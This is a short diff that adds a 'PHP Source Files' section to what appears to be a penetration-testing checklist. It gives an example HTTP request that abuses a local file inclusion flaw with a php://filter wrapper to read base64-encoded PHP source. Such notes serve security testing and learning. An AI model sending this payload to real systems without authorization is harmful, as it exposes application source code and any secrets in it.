@@ -239,6 +239,12 @@ Check each service on CVE details for RCE / LFI / RFI / SQLI issues
 Google search the with the service banner 
 ````
 
+### PHP Source Files
+
+If LFI, try to get source files
+example:
+GET /browse.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
+
 
 
 
